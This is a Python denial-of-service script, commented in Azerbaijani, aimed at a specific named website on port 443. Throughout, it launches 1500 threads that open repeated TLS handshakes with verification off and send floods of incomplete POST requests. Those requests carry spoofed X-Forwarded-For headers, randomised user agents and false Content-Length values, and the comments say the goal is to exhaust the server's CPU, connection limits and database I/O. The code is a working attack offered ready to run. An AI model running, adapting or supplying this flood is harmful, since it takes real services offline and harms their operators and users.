import socket
import ssl
import threading
import random
import time
import os

# --- TARGET EXTREME ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 1500 # Railway Paid üçün bu rəqəm daha asan keçir sistem limitlərini

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def neutron_strike():
    # SSL context-i serveri deşifrə ilə yormaq üçün zəif və mürəkkəb ciphers ilə qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Serveri hər yeni bağlantıda ağır RSA və AES128-GCM hesablamalarına məcbur edir
    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')

    while True:
        try:
            # TCP bağlantısı
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Paket yığılıb qalmasın, anında vursun
            s.settimeout(5)

            # SSL handshaking - serverin CPU-sunu ən çox yoran hissə
            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # HTTP/2 Rapid Reset & Header Fragmentation təqlidi
            # Saniyədə yüzlərlə yarımçıq və mürəkkəb müraciət
            for i in range(250):
                # Hər bir path bazadan fərqli məlumat çəkməyə hesablanıb
                paths = ["/api/v2/items", "/#/register", "/api/user/login", "/api/v3/feed"]
                path = random.choice(paths) + f"?v={random.random()}&id={r_str(30)}"
                
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                    f"X-Requested-With: XMLHttpRequest\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {random.randint(50000, 100000)}\r\n" # Serverə çox böyük data yalanı
                    f"Connection: Keep-Alive\r\n"
                    f"\r\n"
                ).encode()
                
                conn.sendall(payload)
                # İkinci zərbə (Hanging Payload): Serveri buferini təmizləməyə imkan vermə
                conn.send(os.urandom(1)) 

            # Bağlantını bir az saxla ki, serverin port limiti dolsun
            time.sleep(2)
            conn.close()
        except Exception:
            pass

def main():
    print(f"☢️  NEUTRON PROTOCOL ARMED: {TARGET_HOST}")
    print("[!] Saturation target: Origin Server SSL Management & DB I/O.")
    
    for i in range(THREADS):
        t = threading.Thread(target=neutron_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Neutron-Warheads launched...")
            time.sleep(0.1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
